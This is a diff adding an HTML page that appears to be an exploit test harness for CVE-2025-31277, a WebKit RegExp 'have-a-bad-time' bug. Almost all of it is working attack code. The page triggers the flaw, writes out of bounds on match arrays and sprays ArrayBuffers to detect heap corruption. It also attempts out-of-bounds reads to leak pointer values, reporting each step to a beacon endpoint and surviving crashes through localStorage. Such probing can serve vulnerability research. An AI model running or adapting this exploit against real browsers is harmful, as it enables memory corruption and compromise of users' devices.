@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>P1077</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.5 monospace;padding:8px;overflow-y:auto}
+.hud{border:1px solid #1a3a1a;border-radius:4px;margin-bottom:6px;padding:6px;background:#0d1117}
+.title{color:#00ff88;font-size:13px;font-weight:bold;margin-bottom:4px}
+.ok{color:#00ff88}.fail{color:#ff4444}.warn{color:#ffaa00}.info{color:#66aaff}
+.big{font-size:16px;font-weight:bold;padding:8px;border:2px solid;border-radius:4px;margin:6px 0}
+.big.ok{border-color:#00ff88;background:#0a2a0a}
+.big.fail{border-color:#ff4444;background:#2a0a0a}
+</style>
+</head>
+<body>
+<div class="hud">
+<div class="title">P1077 — REGEXP HAVE-A-BAD-TIME OOB</div>
+<div class="info">CVE-2025-31277 | tryCreateContiguousArrayWithPattern bypass</div>
+</div>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight}
+function logBig(c,m){var d=document.createElement('div');d.className='big '+c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight}
+function B(t,d){var m=String(d||'');log('info','[B] P1077-'+t+' | '+m);try{var u='/beacon.php?tag=P1077-'+encodeURIComponent(t);if(m)u+='&data='+encodeURIComponent(m.slice(0,900));u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+function sl(ms){return new Promise(function(r){setTimeout(r,ms)})}
+
+// ============================================================
+// SECTION A: HAVE-A-BAD-TIME BASELINE
+// Verify the mechanism works on this engine
+// ============================================================
+async function sectionA() {
+  log('warn','=== A: HAVE-A-BAD-TIME MECHANISM ===');
+
+  // A1: Can we trigger HABT?
+  var habtTriggered = false;
+  try {
+    function TestClass(){}
+    Object.defineProperty(TestClass.prototype, 0, {
+      configurable: true,
+      get: function(){ return 42; },
+      set: function(v){}
+    });
+    // After this, arrays should use slow indexing
+    var testArr = [];
+    testArr.push(1,2,3);
+    habtTriggered = true;
+    // Clean up
+    delete TestClass.prototype[0];
+    B('A1-HABT', 'triggered:true');
+    log('ok','[A1] HABT trigger: OK');
+  } catch(e) {
+    B('A1-HABT', 'ERR:'+e.message);
+    log('fail','[A1] HABT trigger failed: '+e.message);
+  }
+
+  // A2: Does RegExp match return an array?
+  try {
+    var m = "hello world".match(/o/g);
+    var isArr = Array.isArray(m);
+    var len = m ? m.length : 0;
+    B('A2-MATCH', 'isArray:'+isArr+'|len:'+len+'|type:'+typeof m);
+    log(isArr?'ok':'fail','[A2] match() returns Array: '+isArr+' len:'+len);
+  } catch(e) {
+    B('A2-MATCH', 'ERR:'+e.message);
+    log('fail','[A2] match() error: '+e.message);
+  }
+
+  // A3: Exact PoC trigger from the WebKit test
+  try {
+    function F0(){
+      var C4 = function(){};
+      function f5(a6,a7,a8){ return {__proto__:a7}; }
+      f5(C4,C4);
+      Object.defineProperty(C4, 8, {configurable:true, get: f5, set: f5});
+    }
+
+    // Run the trigger loop
+    var v14;
+    for(var v11=0;v11<5;v11++){
+      v14 = ("size").match(/e/g);
+      new F0();
+      // DON'T do the OOB write yet - just test if we survive
+    }
+
+    var survived = v14 && Array.isArray(v14);
+    B('A3-POC-SAFE', 'survived:'+survived+'|type:'+typeof v14+'|len:'+(v14?v14.length:'null'));
+    log(survived?'ok':'fail','[A3] PoC trigger (safe): survived='+survived);
+  } catch(e) {
+    B('A3-POC-SAFE', 'ERR:'+e.message);
+    log('fail','[A3] PoC trigger error: '+e.message);
+  }
+
+  return habtTriggered;
+}
+
+// ============================================================
+// SECTION B: CONTIGUOUS VS SLOW-PUT DETECTION
+// After HABT, check if match arrays are Contiguous (vuln) or slow (patched)
+// ============================================================
+async function sectionB() {
+  log('warn','=== B: ARRAY TYPE DETECTION ===');
+
+  // B1: Trigger HABT properly
+  try {
+    // Use the exact PoC pattern
+    function MakeHABT() {
+      var Cls = function(){};
+      function getter(a,b,c){ return {__proto__:b}; }
+      getter(Cls, Cls);
+      Object.defineProperty(Cls, 8, {configurable:true, get: getter, set: getter});
+    }
+
+    // Pre-HABT: create a match array and test behavior
+    var preMatch = "abcabc".match(/a/g);
+    var preLen = preMatch.length;
+    // Try to read way past the end - on Contiguous this might not throw,
+    // on slow-put this is just undefined
+    var preOOB = preMatch[10000];
+    B('B1-PRE', 'len:'+preLen+'|oob:'+preOOB+'|type:'+typeof preOOB);
+    log('ok','[B1] Pre-HABT match: len='+preLen+' oob[10000]='+preOOB);
+
+    // Trigger HABT
+    for (var i = 0; i < 5; i++) new MakeHABT();
+    B('B2-HABT', 'triggered');
+    log('ok','[B2] HABT triggered (5 rounds)');
+
+    // Post-HABT: create a match array
+    var postMatch = "abcabc".match(/a/g);
+    var postLen = postMatch.length;
+    var postOOB = postMatch[10000];
+    B('B3-POST', 'len:'+postLen+'|oob:'+postOOB+'|type:'+typeof postOOB);
+    log('ok','[B3] Post-HABT match: len='+postLen+' oob[10000]='+postOOB);
+
+    // B4: THE CRITICAL TEST - write past bounds
+    // On VULNERABLE engine: Contiguous array, write goes to butterfly memory
+    // On PATCHED engine: slow-put array, write is just a property set
+    var testArr = "xyzxyz".match(/x/g);  // length 2
+    B('B4-PRE-WRITE', 'len:'+testArr.length);
+
+    // Write to a moderate index first (within typical butterfly allocation)
+    var writeOk = false;
+    try {
+      testArr[100] = 0xDEAD;
+      writeOk = true;
+      // Read it back
+      var readBack = testArr[100];
+      B('B4-WRITE100', 'wrote:true|readback:'+readBack+'|match:'+(readBack===0xDEAD));
+      log('ok','[B4] Write [100]: '+readBack+' (match='+(readBack===0xDEAD)+')');
+    } catch(e) {
+      B('B4-WRITE100', 'ERR:'+e.message);
+      log('fail','[B4] Write [100] error: '+e.message);
+    }
+
+    // B5: Check if the array's length changed
+    // Contiguous: length stays at original (2), but data is written to butterfly
+    // Slow-put: length may or may not change, but write goes through slow path
+    B('B5-LEN', 'len:'+testArr.length+'|orig:2');
+    log('ok','[B5] Length after write: '+testArr.length+' (was 2)');
+
+    // B6: Try writing to a LARGE index (potential OOB)
+    var largeArr = "aaaa".match(/a/g); // length 4
+    try {
+      largeArr[8192] = 0xCAFE;
+      var rb = largeArr[8192];
+      B('B6-LARGE', 'wrote:true|readback:'+rb+'|len:'+largeArr.length);
+      log('ok','[B6] Write [8192]: '+rb+' len='+largeArr.length);
+    } catch(e) {
+      B('B6-LARGE', 'ERR:'+e.message);
+      log('fail','[B6] Write [8192] error: '+e.message);
+    }
+
+    // B7: Try the EXACT PoC index (41530)
+    var pocArr = "size".match(/e/g); // length 1
+    try {
+      pocArr[41530] = 0xBEEF;
+      var rb2 = pocArr[41530];
+      B('B7-POC-IDX', 'wrote:true|readback:'+rb2+'|len:'+pocArr.length);
+      log('ok','[B7] Write [41530]: '+rb2+' len='+pocArr.length);
+    } catch(e) {
+      B('B7-POC-IDX', 'ERR:'+e.message);
+      log('fail','[B7] Write [41530] error: '+e.message);
+    }
+
+    return true;
+  } catch(e) {
+    B('B-FATAL', 'ERR:'+e.message);
+    log('fail','[B] Fatal: '+e.message);
+    return false;
+  }
+}
+
+// ============================================================
+// SECTION C: OOB HEAP CORRUPTION SCAN
+// Spray ArrayBuffers adjacent to match arrays, then do OOB write,
+// then scan ABs for corruption
+// ============================================================
+async function sectionC() {
+  log('warn','=== C: OOB HEAP CORRUPTION SCAN ===');
+
+  // C1: Setup HABT
+  for (var i = 0; i < 5; i++) {
+    var Cls = function(){};
+    var fn = function(a,b,c){ return {__proto__:b}; };
+    fn(Cls, Cls);
+    Object.defineProperty(Cls, 8, {configurable:true, get: fn, set: fn});
+  }
+  B('C1-HABT', 'ready');
+
+  // C2: Spray small ArrayBuffers to surround future match arrays
+  var spray = [];
+  var views = [];
+  for (var i = 0; i < 500; i++) {
+    var ab = new ArrayBuffer(64);
+    var v = new Uint8Array(ab);
+    // Fill with marker pattern
+    for (var j = 0; j < 64; j++) v[j] = 0xAA;
+    // Store index in first 2 bytes
+    v[0] = i & 0xFF;
+    v[1] = (i >> 8) & 0xFF;
+    spray.push(ab);
+    views.push(v);
+  }
+  B('C2-SPRAY', 'count:500|size:64');
+
+  // C3: Create match arrays interspersed with spray
+  var matchArrays = [];
+  for (var round = 0; round < 20; round++) {
+    // Create match arrays
+    for (var i = 0; i < 10; i++) {
+      var m = ("a]b]c]d]e]f").match(/\]/g); // length 5
+      matchArrays.push(m);
+    }
+    // More spray
+    for (var i = 0; i < 20; i++) {
+      var ab = new ArrayBuffer(64);
+      var v = new Uint8Array(ab);
+      for (var j = 0; j < 64; j++) v[j] = 0xBB;
+      v[0] = (500 + round * 20 + i) & 0xFF;
+      v[1] = ((500 + round * 20 + i) >> 8) & 0xFF;
+      spray.push(ab);
+      views.push(v);
+    }
+  }
+  B('C3-INTERSPERSE', 'matchArrays:'+matchArrays.length+'|totalSpray:'+spray.length);
+
+  // C4: Do OOB writes on ALL match arrays
+  var writeCount = 0;
+  for (var i = 0; i < matchArrays.length; i++) {
+    try {
+      // Write at small OOB offsets (8, 16, 32, 64) to hit nearby allocations
+      matchArrays[i][8] = 0x41414141;
+      matchArrays[i][16] = 0x42424242;
+      matchArrays[i][32] = 0x43434343;
+      writeCount++;
+    } catch(e) {
+      // If it throws, the engine has bounds checking (patched)
+      break;
+    }
+  }
+  B('C4-WRITES', 'count:'+writeCount+'/'+matchArrays.length);
+
+  // C5: Scan ALL spray buffers for corruption
+  var corrupt = [];
+  for (var i = 0; i < views.length; i++) {
+    var v = views[i];
+    if (!v) continue;
+    var expected = (i < 500) ? 0xAA : 0xBB;
+    for (var j = 2; j < 64; j++) { // skip first 2 bytes (index)
+      if (v[j] !== expected) {
+        var hex = '';
+        for (var k = 0; k < 64; k++) hex += ('0'+v[k].toString(16)).slice(-2);
+        corrupt.push({idx: i, off: j, val: v[j], expected: expected, hex: hex});
+        break;
+      }
+    }
+  }
+
+  var msg = 'scanned:'+views.length+'|corrupt:'+corrupt.length;
+  if (corrupt.length > 0) {
+    msg += '|FIRST:idx='+corrupt[0].idx+',off='+corrupt[0].off+',val=0x'+corrupt[0].val.toString(16);
+    logBig('ok', 'HEAP CORRUPTION DETECTED: '+corrupt.length+' buffers modified!');
+    B('C5-HIT', msg);
+
+    for (var i = 0; i < Math.min(corrupt.length, 5); i++) {
+      var x = corrupt[i];
+      log('ok', '  spray['+x.idx+'] off='+x.off+' val=0x'+x.val.toString(16)+' hex='+x.hex.substring(0,40));
+      B('C5-DETAIL-'+i, 'idx:'+x.idx+'|off:'+x.off+'|hex:'+x.hex);
+
+      // BigUint64Array read for pointer values
+      try {
+        var bv = new BigUint64Array(spray[x.idx]);
+        var ptrs = '';
+        for (var p = 0; p < 8; p++) ptrs += p+':0x'+bv[p].toString(16)+'|';
+        B('C5-PTR-'+i, ptrs);
+        log('ok', '  ptrs: '+ptrs.substring(0,200));
+      } catch(e) {}
+    }
+    return true;
+  }
+
+  B('C5-CLEAN', msg);
+  log('warn', '[C5] No corruption in '+views.length+' buffers');
+  return false;
+}
+
+// ============================================================
+// SECTION D: BUTTERFLY OOB READ
+// Use OOB READ on a match array to leak adjacent memory
+// ============================================================
+async function sectionD() {
+  log('warn','=== D: BUTTERFLY OOB READ ===');
+
+  // Ensure HABT
+  for (var i = 0; i < 3; i++) {
+    var Cls = function(){};
+    var fn = function(a,b){ return {__proto__:b}; };
+    fn(Cls, Cls);
+    Object.defineProperty(Cls, 8, {configurable:true, get: fn, set: fn});
+  }
+
+  // Create target objects with known values adjacent to match arrays
+  var targets = [];
+  for (var i = 0; i < 100; i++) {
+    targets.push({a: 0xDEAD0000 + i, b: 0xBEEF0000 + i, c: i});
+  }
+
+  // Create match arrays
+  var matchArrs = [];
+  for (var i = 0; i < 50; i++) {
+    matchArrs.push("test".match(/t/g)); // length 2
+  }
+
+  // OOB read past butterfly
+  var leaks = [];
+  for (var mi = 0; mi < matchArrs.length; mi++) {
+    var m = matchArrs[mi];
+    for (var off = 2; off < 128; off++) {
+      var val = m[off];
+      if (val !== undefined && val !== null) {
+        var vtype = typeof val;
+        var vstr = String(val).substring(0, 50);
+        if (vtype === 'number' && val !== 0 && !isNaN(val)) {
+          leaks.push({mi: mi, off: off, val: val, type: vtype});
+        } else if (vtype === 'object' || vtype === 'string' || vtype === 'function') {
+          leaks.push({mi: mi, off: off, val: vstr, type: vtype});
+        }
+      }
+    }
+  }
+
+  if (leaks.length > 0) {
+    B('D-LEAKS', 'count:'+leaks.length);
+    logBig('ok', 'OOB READ: '+leaks.length+' non-trivial values leaked!');
+    for (var i = 0; i < Math.min(leaks.length, 10); i++) {
+      var lk = leaks[i];
+      log('ok', '  arr['+lk.mi+']['+lk.off+'] = '+lk.val+' ('+lk.type+')');
+      B('D-LEAK-'+i, 'mi:'+lk.mi+'|off:'+lk.off+'|val:'+lk.val+'|type:'+lk.type);
+    }
+
+    // Try to read with Float64Array view to get raw bits
+    // Create a float array from match results
+    for (var mi = 0; mi < Math.min(matchArrs.length, 5); mi++) {
+      var m = matchArrs[mi];
+      var floats = '';
+      for (var off = 2; off < 20; off++) {
+        var v = m[off];
+        if (typeof v === 'number' && v !== 0) {
+          // Convert to hex via DataView
+          var tmpAB = new ArrayBuffer(8);
+          var f64 = new Float64Array(tmpAB);
+          var u64 = new BigUint64Array(tmpAB);
+          f64[0] = v;
+          floats += off+':0x'+u64[0].toString(16)+'|';
+        }
+      }
+      if (floats) {
+        B('D-RAW-'+mi, floats);
+        log('ok', '  raw['+mi+']: '+floats.substring(0, 200));
+      }
+    }
+    return true;
+  }
+
+  B('D-CLEAN', 'leaks:0');
+  log('warn', '[D] No OOB reads returned values');
+  return false;
+}
+
+// ============================================================
+// MAIN
+// ============================================================
+async function run() {
+  /* Section state machine: survive crashes, run each section once.
+     p1077_sec = next section index (0=A,1=B,2=C,3=D,4=done)
+     p1077_res = JSON results map */
+  var sec=0, res={};
+  try{sec=parseInt(localStorage.getItem('p1077_sec')||'0');}catch(e){}
+  try{var r=localStorage.getItem('p1077_res');if(r)res=JSON.parse(r);}catch(e){}
+  if(sec>0&&sec<4&&!res['S'+(sec-1)]){res['S'+(sec-1)]='CRASHED';}
+  function save(){try{localStorage.setItem('p1077_sec',''+sec);
+    localStorage.setItem('p1077_res',JSON.stringify(res));}catch(e){}}
+
+  B('BOOT','sec='+sec+'|prev='+JSON.stringify(res).slice(0,200));
+  log('ok','=== P1077: CVE-2025-31277 EXPLOIT TEST (sec='+sec+') ===');
+
+  if(sec===0){
+    sec=1;save(); /* pre-advance: crash => A CRASHED */
+    res.S0='A:'+(await sectionA());sec=1;save();
+    log('ok','');
+  }
+  if(sec===1){
+    /* pre-advance BEFORE the dangerous OOB writes in B */
+    try{localStorage.setItem('p1077_sec','2');}catch(e){}
+    res.S1='B:'+(await sectionB());sec=2;save();
+    log('ok','');
+  }
+  if(sec===2){
+    try{localStorage.setItem('p1077_sec','3');}catch(e){}
+    res.S2='C:'+(await sectionC());sec=3;save();
+    log('ok','');
+  }
+  if(sec===3){
+    try{localStorage.setItem('p1077_sec','4');}catch(e){}
+    res.S3='D:'+(await sectionD());sec=4;save();
+    log('ok','');
+  }
+
+  var verdict=(res.S2&&res.S2.indexOf('true')>=0)||(res.S3&&res.S3.indexOf('true')>=0);
+  if(verdict){logBig('ok','CVE-2025-31277 IS EXPLOITABLE ON THIS ENGINE!');}
+  else{logBig('fail','CVE-2025-31277: not directly exploitable (patched or needs tuning)');}
+  B('DONE',JSON.stringify(res).slice(0,800)+'|VULN:'+verdict);
+  log('ok','=== P1077 COMPLETE ===');
+  try{localStorage.setItem('p1077_sec','0');localStorage.removeItem('p1077_res');}catch(e){}
+}
+
+run();
+</script>
+</body>
+</html>
